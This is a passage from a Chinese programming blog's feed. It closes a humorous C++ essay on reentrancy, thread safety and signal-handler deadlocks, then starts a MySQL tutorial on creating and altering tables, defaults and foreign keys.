&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 线程切换 ---------&amp;gt;
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">someshit&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">createSomeShit&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>那么 &lt;code>createSomeShit&lt;/code>这段代码就会被执行两次。&lt;/p>
&lt;p>显然这和我们预期的行为不符。&lt;/p>
&lt;p>这里要聊的不是并发，而是&amp;hellip;&amp;hellip;可重入性。所以我们再看看这个函数能否被重入。&lt;/p>
&lt;p>按照 wiki 提供的定义，函数可重入指的是&lt;/p>
&lt;blockquote>
&lt;p>在任意时刻被中断然后操作系统调度执行另外一段代码，这段代码又调用了该子程序不会出错。&lt;/p>
&lt;/blockquote>
&lt;p>符合吗？不。为什么？因为同样在那个线程切换的位置上中断，然后再另一段代码里再次执行这个函数，也会触发同样的问题，导致&lt;code>createSomeShit&lt;/code>被执行两次。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-C++" data-lang="C++">&lt;span class="kt">void&lt;/span> &lt;span class="nf">initialize&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Something&lt;/span>&lt;span class="o">**&lt;/span> &lt;span class="n">someshit&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!*&lt;/span>&lt;span class="n">someshit&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// &amp;lt;-------- 被中断
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 中断处理函数() {
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// initialize(something);
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// }
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 中断结束 --------
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">someshit&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">createSomeShit&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以看出，那些线程不安全的代码，都是不可重入的。&lt;/p>
&lt;p>那么，线程安全的代码，就一定是可重入的吗？&lt;/p>
&lt;h2 id="中断安全性或者叫信号安全性">中断安全性，或者叫信号安全性&lt;/h2>
&lt;p>中断这个东西对其他编程语言的用户来说可能会少见一些，在 C/C++语言里，中断并不是什么新鲜话题。&lt;/p>
&lt;p>在 C 标准库中，规定了一系列的信号和信号处理方法。关于信号的定义可以参考&lt;a class="link" href="https://zh.cppreference.com/w/c/program/signal" target="_blank" rel="noopener"
>这个&lt;/a>。&lt;/p>
&lt;p>当进程接收到信号的时候，当前正在执行的代码就会被中断——注意了，这回，锁救不了你。&lt;/p>
&lt;p>在 C/C++中，中断处理是由一个函数进行。在函数里可能会调用到中断时正在执行的函数。那么问题来了——一个线程安全的函数，是中断安全的函数吗？&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-C++" data-lang="C++">&lt;span class="kt">void&lt;/span> &lt;span class="nf">initialize&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Something&lt;/span>&lt;span class="o">**&lt;/span> &lt;span class="n">someshit&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">mutex&lt;/span>&lt;span class="o">&amp;amp;&lt;/span> &lt;span class="n">realshit&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">lock_guard&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">mutex&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">realshit&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!*&lt;/span>&lt;span class="n">someshit&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="o">*&lt;/span>&lt;span class="n">someshit&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">createSomeShit&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>看上去岁月静好~一切线程切换的问题，都被那句&lt;code>std::lock_guard&amp;lt;std::mutex&amp;gt;(realshit)&lt;/code>给挡在了墙的另一边。&lt;/p>
&lt;p>但是&amp;hellip;&amp;hellip;&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-C++" data-lang="C++">&lt;span class="kt">void&lt;/span> &lt;span class="nf">initialize&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Something&lt;/span>&lt;span class="o">**&lt;/span> &lt;span class="n">someshit&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">mutex&lt;/span>&lt;span class="o">&amp;amp;&lt;/span> &lt;span class="n">realshit&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">lock_guard&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">mutex&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">realshit&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!*&lt;/span>&lt;span class="n">someshit&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// &amp;lt;----- 调皮的用户按下了 Ctrl-C
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 中断处理函数() {
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// initialize(someshit, realshit);
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// // inside initialize {
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// // std::lock_guard&amp;lt;std::mutex&amp;gt;(realshit); // DEAD LOCK
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// // }
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// }
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">someshit&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">createSomeShit&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>看这里~&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-C++" data-lang="C++">&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">lock_guard&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">mutex&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">realshit&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// 进入信号处理
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">lock_guard&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">mutex&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">realshit&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>好了，GG。死锁在这个时候发生了。&lt;/p>
&lt;p>经验丰富的大佬可能注意到了，咱还可以用&lt;code>std::recursive_mutex&lt;/code>啊！&lt;/p>
&lt;p>这里就要提到一个很遗憾的问题了：C/C++的语言标准给了哪些保证。&lt;/p>
&lt;p>C 对信号处理函数的定义很粗暴，除了&lt;code>abort&lt;/code>、&lt;code>_Exit&lt;/code>、&lt;code>quick_exit&lt;/code>、&lt;code>signal&lt;/code>、&lt;code>stdatomic.h的免锁原子函数&lt;/code>、&lt;code>atomic_is_lock_free与任何类型的原子参数&lt;/code>这些函数以外，任何标准库函数的调用，行为都是未定义的。&lt;/p>
&lt;p>C++对信号处理函数的定义则更加复杂，限制比之 C 更加严格。毕竟标准库要庞大得多&amp;hellip;&amp;hellip;也不是不能理解。&lt;/p>
&lt;p>标准中有个一个地方的描述很微妙：&lt;strong>&amp;hellip;&amp;hellip;免锁的&lt;/strong>。&lt;/p>
&lt;p>换言之，谁又保证了信号处理函数必然和你希望的那个线程是同一个线程呢？&lt;/p>
&lt;p>&lt;code>std::recursive_mutex&lt;/code>的实现依赖于平台提供的系统 API，反正我没有找到语言标准中相关的规定要求信号处理函数必须和&lt;code>main&lt;/code>函数在同一个线程，所以我认为这是平台相关的问题：这样的代码是&lt;strong>不可移植的&lt;/strong>。&lt;/p>
&lt;p>按照设计模式原则，我们是面向接口——也就是标准文档编程，而不是面对实现——Visual C++、GCC、MinGW 或者哪个中东土豪在未来某天突发奇想送我一台 MIPS 的超算的话。&lt;/p>
&lt;p>到业务层面的话会更灵活一些——反正我只在某环境下跑，等公司什么时候全面换平台了，咱再能改则改，改不了就跑路。&lt;/p>
&lt;h2 id="递归函数和可重入">递归函数和可重入&lt;/h2>
&lt;p>递归和重入有一定的相似性，但又有所不同。&lt;/p>
&lt;p>一个递归函数，直觉上来讲，好像应该是可重入的：因为它要调用自己。&lt;/p>
&lt;p>那么&amp;hellip;&amp;hellip;事实上呢？&lt;/p>
&lt;p>写个比较骚的递归删除链表节点的例子。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-C++" data-lang="C++">&lt;span class="kt">void&lt;/span> &lt;span class="nf">removeNode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Node&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">node&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">length&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">Node&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">tmp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">node&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">prev&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">node&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">next&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">prev&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">tmp&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// &amp;lt;------ 出现了！中断兽！
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 不用看了，Node之间的联结已经被破坏了
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 离开了！中断兽！--------&amp;gt;
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">tmp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">next&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">node&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">next&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">freeNode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">node&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">removeNode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">tmp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">next&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">length&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>轻易地否定了递归函数=可重入函数的直觉想法。&lt;/p>
&lt;p>深究下去，又到了线程安全——然后是死锁——然后提出了&lt;code>std::recursive_mutex&lt;/code>或者其他类似的操作——最后走到平台相关的 API 和保证——失去可移植性。&lt;/p>
&lt;p>为什么我一直在提可移植性？&lt;/p>
&lt;p>emmmm，大概是装逼如风，常伴吾身吧。&lt;/p>
&lt;h2 id="标准库好烦人啊">标准库好烦人啊&lt;/h2>
&lt;p>C/C++语言的标准库是出了名的——但不是好的方面，而是他们总在修修补补又一年。&lt;/p>
&lt;p>C 标准库还好说——毕竟语言本身没啥特性，全靠各种平台提供 API 撑着。标准库改来改去也只是割个双眼皮的程度。&lt;/p>
&lt;p>C++要更骚气一些，每隔几年就整个容，简直不给人活路。&lt;/p>
&lt;p>就中断安全来说，虽然不知道内部怎么实现的，但是&amp;hellip;&amp;hellip;printf 这样的函数在信号处理函数里调用的话，也算是未定义行为。&lt;/p>
&lt;p>认输吧，你是斗不过标准的。该依赖平台行为的时候，就去依赖平台行为吧。&lt;/p>
&lt;h2 id="文档引用">文档引用&lt;/h2>
&lt;p>懒得找原文，直接看 cppreference 对 signal 的说法就好。有兴趣的话可以找又臭又长的&lt;a class="link" href="http://www.open-std.org/JTC1/SC22/WG14/www/docs/n1570.pdf" target="_blank" rel="noopener"
>WG14 - N1570 - C11&lt;/a>，还有&lt;a class="link" href="http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2017/n4659.pdf" target="_blank" rel="noopener"
>WG21 - N4659 - C++17&lt;/a>这两本标准文档。&lt;/p>
&lt;h2 id="尾声">尾声&lt;/h2>
&lt;p>于是这会儿就到了其他各种语言的用户惯例吐槽的时候：&lt;/p>
&lt;blockquote>
&lt;p>&amp;hellip;大佬是公司里唯一用 C++写代码的人。他对人说话，总是满口“目标平台”、“标准”、“可移植性”之类的话，叫人半懂不懂的。因为他总是说“C++天下第一！”，别人便从他说的那些半懂不懂的话里，替他取下个绰号，叫 C++大神。&lt;/p>
&lt;p>C++大神一到公司里，程序员们便看着他笑，有的叫道：“C++大神，你的代码又编译出错了！”&lt;/p>
&lt;p>他不回答，对前台说：“倒上特浓的咖啡，今天也要加班到夜里。”便拿出员工卡。程序员们又高声叫嚷道：“你一定又用上新标准了吧？”&lt;/p>
&lt;p>C++大神睁大眼睛说，“你怎么凭空污人清白！”&lt;/p>
&lt;p>“什么清白？我前天亲眼看见你的代码编译报了错，整整十几 MB 的日志！”&lt;/p>
&lt;p>C++大神便涨红了脸，额上的青筋条条绽出，争辩道，“编译器报错怎么能叫错&amp;hellip;&amp;hellip;C++&amp;hellip;&amp;hellip;编译器不支持，那能算错么？”&lt;/p>
&lt;p>接连便是难懂的话，什么“CONCEPT 还不加入标准”、“未定义行为就该是编译错误”、“SFINAE 就是给编译器开洞”、“boost 大法好，天灭 std::experimental”，引得众人都哄笑起来：店内外充满了快活的空气。&lt;/p>
&lt;/blockquote></description></item><item><title>MySQL 24小时入门笔记 - 4</title><link>https://nnnewb.github.io/blog/p/mysql-24%E5%B0%8F%E6%97%B6%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-4/</link><pubDate>Sat, 23 Jun 2018 22:34:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/mysql-24%E5%B0%8F%E6%97%B6%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-4/</guid><description>&lt;h2 id="创建表">创建表&lt;/h2>
&lt;h3 id="create-table">CREATE TABLE&lt;/h3>
&lt;p>&lt;code>CREATE TABLE&lt;/code>的作用是创建表。不多说，先创建个简单的学生表。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="k">CREATE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">TABLE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">students&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">int&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">char&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">NOT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">NULL&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">primary&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">key&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这里没写 &lt;code>ENGINE=InnoDB&lt;/code>，因为这是新 MariaDB 的默认值。&lt;/p>
&lt;p>那么进入正题，&lt;code>CREATE TABLE&lt;/code>的语法如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="k">CREATE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">TABLE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">表名&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">列名&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">类型&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">约束和其他属性&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">列名&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">类型&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">约束和其他属性&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">....&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">其他表配置&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>很容易看出，括号里面写的是表的相关配置，包括列定义，主键定义，索引定义等等。&lt;/p>
&lt;h3 id="默认值">默认值&lt;/h3>
&lt;p>在创建表时可以指定默认值，有默认值的列在插入时可以不填。&lt;/p>
&lt;p>语法如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="k">CREATE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">TABLE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">表&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">列&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">类型&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">DEFAULT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">值&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>即可为一个列设定默认值。&lt;/p>
&lt;h3 id="非空">非空&lt;/h3>
&lt;p>非空约束非常常见。比如说，我们要记录学生信息，包括学号、成绩、姓名，那么学生姓名能不能留空呢？显然不行，因为没有姓名的记录让谁看都是一脸懵逼，这破坏了一条记录的完整性。&lt;/p>
&lt;p>创建非空约束的语法如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="k">CREATE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">TABLE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">表&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">列&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">类型&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">NOT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">NULL&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这就创建了非空约束。非空约束下，插入数据时不能不填写这个列。&lt;/p>
&lt;p>如果需要要求可空，那么这样做。但一般不用特地写，很多&lt;code>DBMS&lt;/code>的列默认创建就是可空的。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="k">CREATE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">TABLE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">表&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">列&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">类型&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">NULL&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="修改表">修改表&lt;/h2>
&lt;h3 id="alter-table">ALTER TABLE&lt;/h3>
&lt;p>&lt;code>ALTER TABLE&lt;/code>可以修改表定义，添加删除列，修改约束，等等。&lt;/p>
&lt;h3 id="添加列">添加列&lt;/h3>
&lt;p>举例，在一个只有学号和姓名两个列的学生表加入一个新的成绩列，代码如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="k">ALTER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">TABLE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">students&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">ADD&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">score&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">int&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>语法基本是这样。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="k">ALTER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">TABLE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">表名&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">ADD&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">列名&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">类型&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">其他属性和约束&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>后面列的定义写法基本和&lt;code>CREATE TABLE&lt;/code>时差不多。&lt;/p>
&lt;h3 id="删除列">删除列&lt;/h3>
&lt;p>和添加列差不多，但删除的关键字&lt;strong>不是&lt;/strong>&lt;code>DELETE&lt;/code>，而是&lt;code>DROP&lt;/code>。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="k">ALTER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">TABLE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">表名&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">DROP&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">列名&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="添加外键约束">添加外键约束&lt;/h3>
&lt;p>外键约束其实保证的是&lt;strong>引用完整性&lt;/strong>，外键约束的列的值必须引用了一个有效的行，或者是&lt;code>NULL&lt;/code>。&lt;/p>
&lt;p>举例来说，我们先有两个表。&lt;/p>
&lt;p>学生表&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>id&lt;/th>
&lt;th>name&lt;/th>
&lt;th>class&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>student 1&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>2&lt;/td>
&lt;td>student 2&lt;/td>
&lt;td>2&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>3&lt;/td>
&lt;td>student 3&lt;/td>
&lt;td>3&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>班级表&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>id&lt;/th>
&lt;th>level&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>Lv5&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>2&lt;/td>
&lt;td>Lv4&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>3&lt;/td>
&lt;td>Lv3&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>为了让学生表的&lt;code>class&lt;/code>关联到班级表的&lt;code>id&lt;/code>，我们要这样做。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="k">ALTER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">TABLE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">students&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">ADD&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">CONSTRAINT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">fk_students_classes&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">FOREIGN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">KEY&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">class&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">REFERENCES&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">classes&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>语法基本是这样子的&lt;/p>
